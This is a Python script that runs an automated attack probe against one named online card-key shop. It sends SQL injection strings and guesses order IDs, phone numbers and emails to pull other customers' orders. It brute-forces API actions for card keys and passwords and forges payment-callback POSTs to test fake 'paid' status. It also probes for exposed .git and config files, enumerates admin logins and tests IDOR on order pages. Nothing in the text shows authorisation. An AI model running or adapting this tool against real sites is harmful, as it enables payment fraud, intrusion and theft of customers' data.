#!/usr/bin/env python3
"""Focused fast probe - critical vulns only, 3s delay."""
import re, json, time, subprocess
from datetime import datetime

BASE = "https://xinhe001.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
COOKIE = "/tmp/xinhe_fast_cookies.txt"
DELAY = 3
findings = []

def curl(url, method="GET", data=None, timeout=20):
    time.sleep(DELAY)
    cmd = ["curl","-sS","-m",str(timeout),"-A",UA,"-c",COOKIE,"-b",COOKIE,"-w","\n__C__%{http_code}"]
    if method=="POST":
        cmd += ["-X","POST"]
        if data: cmd += ["-d", data]
    cmd.append(url)
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8","replace")
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8","replace")
    if "__C__" in out:
        body, code = out.rsplit("__C__",1)
        return body, int(code.strip())
    return out, 0

def hit(level, title, detail):
    findings.append({"level":level,"title":title,"detail":detail})
    print(f"[{level}] {title}\n  {detail[:300]}")

# session
body, _ = curl(f"{BASE}/")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', body)
csrf = csrf.group(1) if csrf else ""

# 1 getshop diff
print("=== getshop ===")
msgs = {}
for tn in ["1","2","10","100","1000","999999","2025070900001","abc","''","1 OR 1=1"]:
    b, c = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    s = b.strip()[:150]
    msgs.setdefault(s, []).append(tn)
    print(f"  {tn:20} -> {s}")
if len(msgs) > 1:
    hit("Med", "getshop 响应分化", str(msgs))

# 2 query leak
print("\n=== query ===")
for q in ["1","2","10","100","13800138000","admin@qq.com","20250709"]:
    b, c = curl(f"{BASE}/?mod=query&data={q}")
    if "没有查询到" not in b and "empty" not in b.lower():
        tbody = b[b.find("<tbody>"):b.find("</tbody>")+8] if "<tbody>" in b else ""
        if tbody and "没有" not in tbody and "empty" not in tbody:
            hit("High", f"订单查询命中 data={q}", tbody[:400])
    # SQL errors
    if re.search(r'SQL|mysql|syntax|Warning', b, re.I):
        hit("High", f"SQLi error query data={q}", b[:400])

# 3 api acts - common faka
print("\n=== api.php ===")
api_ok = {}
for act in ["goods","goodslist","shop","order","orders","query","kmlist","km","card",
            "stock","user","login","recharge","balance","pay","notify","check","info","site","fenlei"]:
    b, c = curl(f"{BASE}/api.php?act={act}")
    if b.strip() and "No Act" not in b and "reset" not in b.lower():
        api_ok[act] = b[:200]
        print(f"  {act}: {b[:120]}")
        if any(x in b for x in ['"km"','"card"','"password"','"pwd"','"money"']):
            hit("High", f"api.php act={act} 敏感字段", b[:300])
if api_ok:
    hit("Med", "api.php 有效接口", json.dumps(api_ok, ensure_ascii=False)[:600])

# 4 notify forgery
print("\n=== notify ===")
for p, data in [
    ("other/notify.php", "trade_no=1&out_trade_no=1&money=9&status=1"),
    ("other/return.php", "trade_no=1"),
    ("other/epay_notify.php", "pid=1&trade_no=1&money=9&status=TRADE_SUCCESS"),
]:
    b1, _ = curl(f"{BASE}/{p}")
    b2, _ = curl(f"{BASE}/{p}", method="POST", data=data)
    print(f"  {p}: GET={b1[:60]} POST={b2[:80]}")
    if b2.strip() in ("success","ok","SUCCESS") or '"code":1' in b2 or '"code":0' in b2:
        hit("High", f"支付回调疑似可伪造 {p}", f"POST {data} -> {b2[:200]}")

# 5 paths
print("\n=== paths ===")
for p in ["install/install.lock","install/","admin/",".git/HEAD","phpinfo.php",
          "user/ajax.php?act=login","other/getshop.php","cron.php","config.php"]:
    b, c = curl(f"{BASE}/{p}")
    print(f"  {p}: {c} {len(b)} {b[:70].replace(chr(10),' ')}")
    if p == "install/install.lock" and c == 200 and b.strip():
        hit("Med", "install.lock 可HTTP读取", b[:100])
    if p == ".git/HEAD" and c == 200 and "ref:" in b:
        hit("High", ".git 泄露", b[:100])

# 6 login enum
print("\n=== login ===")
b, _ = curl(f"{BASE}/user/login.php")
csrf2 = re.search(r'csrf_token\s*=\s*"([^"]+)"', b)
if csrf2:
    for u in ["admin","administrator","xinghe","test","root"]:
        b2, _ = curl(f"{BASE}/user/ajax.php?act=login", method="POST",
                     data=f"user={u}&pass=wrong&csrf_token={csrf2.group(1)}")
        print(f"  {u}: {b2[:100]}")
        if "不存在" in b2 or "未注册" in b2:
            hit("Med", "登录用户枚举", f"{u}: {b2}")

# 7 pay without captcha
print("\n=== pay probe ===")
b, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=9")
hashsalt_m = re.search(r'var hashsalt=([^;]+);', b)
hs = hashsalt_m.group(1) if hashsalt_m else '""'
csrf3 = re.search(r'csrf_token\s*=\s*"([^"]+)"', b)
if csrf3:
    data = (f"tid=9&inputvalue=testpwd123&inputvalue2=&inputvalue3=&inputvalue4=&inputvalue5="
            f"&num=1&hashsalt={hs}&csrf_token={csrf3.group(1)}")
    b2, _ = curl(f"{BASE}/ajax.php?act=pay", method="POST", data=data)
    print(f"  pay: {b2[:200]}")
    if '"trade_no"' in b2 or '"code":0' in b2:
        hit("Med", "无需验证码可创建订单", b2[:300])
        # try getshop on returned trade_no
        import json as J
        try:
            j = J.loads(b2)
            tn = j.get("trade_no","")
            if tn:
                b3, _ = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
                print(f"  getshop own order: {b3[:150]}")
        except: pass

# 8 mod=order IDOR
print("\n=== order page IDOR ===")
for oid in ["1","2","100","20250709001"]:
    b, c = curl(f"{BASE}/?mod=order&orderid={oid}")
    if "支付" in b or "dopay" in b or "trade" in b.lower():
        if "不存在" not in b and "错误" not in b:
            hit("Med", f"order页面可访问 orderid={oid}", b[b.find("trade"):b.find("trade")+200] if "trade" in b else b[:200])
    print(f"  orderid={oid}: len={len(b)} pay={'dopay' in b}")

with open("/workspace/aaap-recon/xinhe_fast_results.json","w") as f:
    json.dump({"ts":datetime.utcnow().isoformat(),"findings":findings}, f, ensure_ascii=False, indent=2)
print(f"\nDONE {len(findings)} findings")
